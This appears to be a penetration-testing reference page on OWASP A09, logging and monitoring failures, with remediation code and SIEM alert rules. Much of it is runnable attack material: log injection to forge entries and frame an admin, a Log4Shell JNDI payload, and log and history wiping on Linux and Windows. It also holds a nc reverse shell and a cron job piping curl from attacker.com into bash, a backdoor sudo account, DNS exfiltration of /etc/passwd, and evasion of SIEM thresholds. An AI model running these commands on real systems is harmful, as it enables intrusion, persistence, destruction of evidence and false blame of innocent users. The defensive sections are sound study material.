# A09: Security Logging and Monitoring Failures

OWASP #9. Previously "Insufficient Logging & Monitoring" (#10 in 2017).
CWEs: CWE-117, CWE-223, CWE-532, CWE-778.
Without logging and monitoring, breaches go undetected. Average dwell time: 197 days.

---

## Overview

Logging and monitoring failures allow attackers to persist undetected, pivot freely,
and cover their tracks. From an attacker's perspective, this is a capability to
preserve—from a defender's perspective, the goal is to detect every meaningful event.

**Attacker-relevant topics:**
- Log injection (corrupt/forge log entries)
- Detection evasion (stay under alert thresholds)
- SIEM blind spots (events that aren't logged)
- Covering tracks (delete/overwrite logs)
- Log analysis for intel gathering (when you have access)

**Defender-relevant topics:**
- What must be logged
- Log integrity protection
- SIEM detection logic
- Alerting thresholds and tuning

---

## Detection Methods

```bash
# Check if application logs authentication events
# Login as attacker, check if event appears in logs
ssh user@target.com
sudo tail -50 /var/log/auth.log | grep "Failed\|Accepted"

# Check log verbosity (black-box)
# Trigger error conditions and see if they appear in any exposed log endpoint
curl https://target.com/api/user?id=INVALID
curl https://target.com/actuator/logfile    # Spring Boot
curl https://target.com/logs               # common exposed endpoint

# Test log injection
curl -H "User-Agent: test%0aFORGED LOG ENTRY" https://target.com/
# If logging User-Agent verbatim → log injection possible

# Check for exposed log files
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mr "error|exception|stack trace|warning|debug" -mc 200

# SIEM blind spot: check if specific events generate alerts
# (white-box: query SIEM for specific event types)
# (black-box: perform action and observe if any response/blocking occurs)
```

---

## What to Look For

**Events that MUST be logged (and often aren't):**
- Failed login attempts with username, IP, timestamp
- Successful logins (especially admin)
- Account lockout events
- Password reset requests and completions
- Permission/privilege changes
- Access to sensitive data (PII, financial records)
- Admin actions (create/delete user, change config)
- Input validation failures (injection attempts)
- API authentication failures
- File access events for sensitive files

**Common SIEM blind spots:**
- API calls (only web tier logged, API tier not)
- Database direct queries (no app layer logging)
- Internal service-to-service calls
- Cloud object storage access (S3 access logs often disabled)
- DNS queries (rarely sent to SIEM)
- Encrypted channel contents (TLS termination not logged)
- Batch/scheduled job activity
- Read operations (only writes logged)

**Log quality issues:**
- Timestamps not in UTC or no timezone
- No correlation ID / request ID
- Missing source IP (proxied traffic not preserving real IP)
- User agent logged but not user identity
- Passwords/secrets appearing in URLs → logged in access logs
- Sensitive data in log messages (credit card, SSN)

---

## Testing Methodology

### 1. Log Injection Testing
```bash
# HTTP header injection into logs
# If server logs User-Agent, X-Forwarded-For, Referer verbatim:
curl -H "User-Agent: Mozilla/5.0
2026-01-01 00:00:00 INFO Authentication successful for user=admin ip=192.168.1.1" \
  https://target.com/

# This inserts a fake "successful login for admin" into logs
# Useful for: covering tracks, framing other users, confusing analysts

# Null byte injection (terminates log line in some systems)
curl -H "User-Agent: malicious%00legitimate looking agent" https://target.com/

# CRLF injection (%0d%0a = \r\n)
curl "https://target.com/page?ref=legit%0d%0a2026-01-01+admin+login+success" \
  -H "Referer: normal%0d%0aINJECTED: fake admin login at $(date)"

# Log4Shell as log injection (if Log4j used)
curl -H "User-Agent: \${jndi:ldap://attacker.com/a}" https://target.com/
# Gets logged → Log4j evaluates JNDI reference → RCE
```

### 2. Detection Evasion
```bash
# Slow and low - stay under rate-based alerts
# Instead of 100 req/sec:
for user in $(cat users.txt); do
  curl -s -d "user=$user&pass=Password1!" https://target.com/login
  sleep 30  # 2 per minute vs typical 100/sec alert threshold
done

# Distribute across IPs (alerts trigger per-source-IP)
for i in {1..50}; do
  IP="1.2.3.$i"
  curl -H "X-Forwarded-For: $IP" -d "user=admin&pass=attempt$i" \
    https://target.com/login
done

# Business hours camouflage
# Run scans between 09:00-17:00 local time → blends with normal traffic
# Avoid: weekends, overnight, holidays

# Mimic legitimate user behavior
# Add realistic User-Agent, Referer, session flow
# Don't hit 404s repeatedly (triggers alerts)
# Vary request timing (not perfectly regular)

# Low-and-slow port scan
nmap -T1 -sS target.com  # Slowest timing template
# vs default: nmap target.com  # much faster, more detectable
```

### 3. Identifying SIEM Blind Spots
```bash
# Test what events are not alerted on
# Technique: perform action, observe if any response/blocking/contact occurs

# Check if database access is logged
# (requires access to DB) - run query directly, see if it appears in SIEM
mysql -h db.internal -u dbuser -p -e "SELECT * FROM users LIMIT 1"
# vs: access same data through app API

# Check if API calls are logged separately from web
curl -H "Authorization: Bearer TOKEN" https://api.target.com/v1/users
# App logs → does api.target.com have same logging as www.target.com?

# S3 access logging verification
aws s3 ls s3://target-bucket --no-sign-request
# Check: is CloudTrail logging S3 GetObject events?
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
  --start-time "2026-01-01T00:00:00Z"

# Check audit trail completeness
# Perform sensitive action, immediately query audit log
# Time lag > 5 minutes = real-time detection impossible
```

### 4. Log Analysis for Intel (Post-Compromise)
```bash
# Once you have shell access - read logs for intel
# Auth logs - who has logged in, from where
cat /var/log/auth.log | grep "Accepted\|Failed" | tail -100
grep "sudo" /var/log/auth.log | tail -50
last -50   # Recent logins

# Web server logs - map application structure
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -50
# Frequent 404s = discovery attempts
# POST endpoints = data submission
# Admin paths = privileged functions

# Application logs - find credentials, tokens, PII in logs
grep -rniE "(password|passwd|token|api_key|secret|bearer|authorization)" /var/log/
find /var/log -name "*.log" | xargs grep -l "password\|secret\|token" 2>/dev/null

# Cron and scheduled jobs
cat /var/spool/cron/crontabs/root
cat /etc/crontab
ls /etc/cron.d/
# Scheduled jobs may reveal credentials, backup scripts, data exports

# Docker/container logs
docker logs CONTAINER_ID 2>&1 | grep -iE "error|warning|password|token|secret"
```

---

## Exploitation Techniques

### Log Injection - Frame Another User
```python
import requests

# Inject log entry that frames admin account
# After your own malicious activity:
injected_log = """admin
2026-05-30 10:00:00 INFO [AuthService] Logout successful for user=admin ip=10.0.0.1
2026-05-30 10:00:01 INFO [AuthService] Login successful for user=admin ip=10.0.0.1
2026-05-30 10:00:05 INFO [DataService] Export triggered by user=admin"""

headers = {
    'User-Agent': f'Mozilla/5.0\n{injected_log}',
    'X-Forwarded-For': '10.0.0.1\nINJECTED'
}
requests.get('https://target.com/', headers=headers)
# Log now contains fake "admin" activity that analysts may attribute to admin
```

### Covering Tracks After Compromise
```bash
# Linux - remove evidence of access
# Clear auth logs (risky - creates suspicious gap)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# More subtle: edit out specific entries
# Remove your IP from auth log
grep -v "192.168.100.50" /var/log/auth.log > /tmp/auth_clean.log
cp /tmp/auth_clean.log /var/log/auth.log

# Restore file timestamps (access time)
touch -a -m -t 202312150900 /var/log/auth.log

# Clear bash history
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE
export HISTSIZE=0

# Kill log daemon temporarily (risky)
# systemctl stop rsyslog
# ...do malicious activity...
# systemctl start rsyslog

# Prevent logging in current session
export HISTFILE=/dev/null
export HISTSIZE=0
unset HISTFILE

# On Windows - clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
# More targeted:
wevtutil cl Security /q:"*[System[EventID=4625]]"   # Remove only failed logins
```

### Exploiting Missing Monitoring for Persistence
```bash
# If outbound connections aren't monitored:
# Establish C2 over DNS (often unmonitored)
# Use dnscat2 or iodine for DNS tunneling
dnscat2 --secret=mysecret attacker.com

# If only common ports monitored, use unusual port
# Or use HTTPS to blend with web traffic
nc -e /bin/bash attacker.com 443  # HTTPS port

# Scheduled task to re-establish access (if no job monitoring)
echo "*/5 * * * * curl -s http://attacker.com/cmd.sh | bash" | crontab -
# Runs every 5 minutes, re-establishes shell

# Backdoor user account (if no account creation alerts)
useradd -m -s /bin/bash -G sudo backupuser
echo "backupuser:Password123!" | chpasswd
# Or add SSH key to existing user
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

---

## Verification

```bash
# Verify log injection is possible
# 1. Send CRLF payload
curl -v "https://target.com/?ref=test%0d%0aINJECTED_LINE_FROM_ATTACKER" 2>&1 | head -20
# 2. Check access logs
tail -5 /var/log/nginx/access.log
# If "INJECTED_LINE_FROM_ATTACKER" appears as separate line → vulnerable

# Verify events ARE being logged
# 1. Trigger a known loggable event (failed login)
curl -d "user=admin&pass=WRONG_PASSWORD" https://target.com/login
# 2. Check log
grep "admin" /var/log/app/auth.log | tail -5
# If no entry → critical logging gap

# Verify log integrity protection
# 1. Modify a log entry
echo "TAMPERED" >> /var/log/auth.log
# 2. If log integrity monitoring exists: alert should fire within minutes
# 3. Check SIEM for log tampering alert

# Verify SIEM receives events in near-real-time
time curl -d "user=admin&pass=wrong" https://target.com/login
# Check SIEM dashboard → event should appear within 60s
```

---

## Common Problems & Solutions

| Logging Failure | Risk | Fix |
|----------------|------|-----|
| No failed login logging | Brute force undetected | Log all auth events: timestamp, user, IP, success/fail |
| No centralized log collection | Logs lost if server compromised | Ship logs to SIEM in real-time (Splunk, Elastic, Loki) |
| Logs contain sensitive data | PII/credential exposure | Redact before logging: mask passwords, tokens |
| Log injection via user input | Log forging | Sanitize CRLF from logged values |
| No log integrity | Attacker edits logs | Write to append-only storage, use WORM |
| Insufficient context | Can't investigate | Log: timestamp, user, IP, request ID, action, resource |
| No alerting on critical events | Breach undetected | Alert on: mass failures, privilege changes, admin actions |
| Log retention too short | Evidence lost | Minimum 90 days hot + 1 year cold storage |

---

## Tools (with Commands)

```bash
# Log analysis
# grep with context
grep -B2 -A2 "Failed password" /var/log/auth.log

# GoAccess - real-time web log analyzer
goaccess /var/log/nginx/access.log --log-format=COMBINED -o report.html

# Logwatch - log summarizer
logwatch --output stdout --format text --range today --detail high

# Splunk (query language)
# Failed logins by IP:
index=security sourcetype=linux_secure "Failed password" | stats count by src_ip | sort -count

# Elastic/Kibana query
GET /logs-*/_search
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event.outcome": "failure"}},
        {"match": {"event.category": "authentication"}}
      ]
    }
  }
}

# OSSEC/Wazuh - host-based IDS
# Check active rules:
/var/ossec/bin/ossec-logtest < /var/log/auth.log

# Auditd - kernel-level audit
auditctl -l                    # list rules
ausearch -k exec_commands      # search by key
aureport --login               # login report
aureport --failed              # failed events

# Log4j detection
grep -r "\${jndi:" /var/log/
```

---

## Bypass Techniques

### Evading SIEM Rules
```bash
# Rate-based rules: slow down
# Alert: ">10 failed logins in 60s from same IP"
# Bypass: 1 attempt per 90s = stays under threshold

# Threshold-based: distribute
# Alert: ">5 failed logins for same username"
# Bypass: different usernames each attempt (password spray)

# Pattern-based: obfuscate
# Alert: User-Agent contains "sqlmap" or "nikto"
# Bypass: custom/legitimate-looking User-Agent
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" ...

# Time-based: operate during alert suppression windows
# Many orgs have "maintenance windows" with reduced alerting
# Or alert fatigue: fire many false positives first, then go quiet

# Protocol/port evasion
# DNS exfil (often not logged/alerted):
nslookup $(cat /etc/passwd | base64 | head -c63).attacker.com
# ICMP tunnel: icmpsh, ptunnel
# HTTP/HTTPS to CDN that proxies to C2

# Evade file integrity monitoring
# Modify file, restore timestamp, restore hash
# (requires root access to integrity monitor itself)
cp /etc/passwd /tmp/passwd.bak
# modify
touch -r /tmp/passwd.bak /etc/passwd
# Can't fix hash without knowing monitoring tool's secret key
```

### Log Deletion Without Triggering Alerts
```bash
# Truncate instead of delete (file descriptor stays open, no "deleted" event)
> /var/log/auth.log   # truncate to zero, inode preserved

# Replace specific lines only
sed -i '/ATTACKER_IP/d' /var/log/auth.log
sed -i '/192\.168\.100\.50/d' /var/log/syslog

# If logrotate is running, wait for rotation
# Rotated logs (.gz) are often kept for 7-30 days
# Previous session's activity may be in rotated logs:
zgrep "attacker" /var/log/auth.log.*.gz

# Redirect new log entries to /dev/null while active
# (requires killing rsyslogd temporarily - very detectable)
```

---

## Remediation

```python
# Structured logging with proper sanitization
import logging, json, re
from datetime import datetime, timezone

def sanitize_log_value(value):
    """Remove CRLF and control characters from log values"""
    if isinstance(value, str):
        value = re.sub(r'[\r\n\x00-\x1f\x7f]', '', value)
    return value

def log_security_event(event_type, user_id, ip_address, resource, outcome, **kwargs):
    """Structured security event logging"""
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": event_type,
        "user_id": sanitize_log_value(str(user_id)) if user_id else "anonymous",
        "source_ip": sanitize_log_value(ip_address),
        "resource": sanitize_log_value(resource),
        "outcome": outcome,  # "success" | "failure"
        "request_id": kwargs.get("request_id", ""),
    }
    # Add extra context (sanitized)
    for k, v in kwargs.items():
        if k not in ("password", "token", "secret", "card_number"):  # Never log these
            event[sanitize_log_value(k)] = sanitize_log_value(str(v))

    logging.getLogger("security").info(json.dumps(event))

# Usage:
log_security_event(
    event_type="authentication",
    user_id=user.id,
    ip_address=request.remote_addr,
    resource="/api/login",
    outcome="failure",
    reason="invalid_password",
    request_id=request.headers.get("X-Request-ID")
)
```

```yaml
# Alerting rules (Elasticsearch Watcher example)
# Alert on 5+ failed logins in 5 minutes from same IP:
{
  "trigger": {"schedule": {"interval": "1m"}},
  "input": {
    "search": {
      "request": {
        "indices": ["logs-*"],
        "body": {
          "query": {
            "bool": {
              "must": [
                {"range": {"@timestamp": {"gte": "now-5m"}}},
                {"term": {"event.outcome": "failure"}},
                {"term": {"event.category": "authentication"}}
              ]
            }
          },
          "aggs": {
            "by_ip": {
              "terms": {"field": "source.ip", "min_doc_count": 5}
            }
          }
        }
      }
    }
  },
  "condition": {"compare": {"ctx.payload.aggregations.by_ip.buckets": {"not_eq": []}}},
  "actions": {"send_alert": {"email": {"to": "soc@company.com", "subject": "Brute Force Detected"}}}
}
```

---

## Real-World CVEs / Incidents

| Incident | Year | Logging Failure | Impact |
|----------|------|----------------|--------|
| Equifax 2017 | 2017 | 76-day dwell time; certificate expired → TLS inspection blind | 147M SSNs stolen |
| Target 2013 | 2013 | SIEM alerts fired but ignored | 40M credit cards |
| Capital One 2019 | 2019 | 197-day dwell time before discovery | 100M records |
| SolarWinds 2020 | 2020 | No anomaly detection on build pipeline | 18,000 orgs backdoored |
| Uber 2016 | 2016 | Breach not reported for 12 months | 57M records, $148M fine |
| Marriott 2014-2018 | 2018 | 4-year undetected breach | 500M guest records |
| Log4Shell 2021 | 2021 | Log injection → RCE via logging library itself | ~10M vulnerable servers |
| CWE-117 | N/A | Log injection (CRLF) | Log forging, evidence tampering |
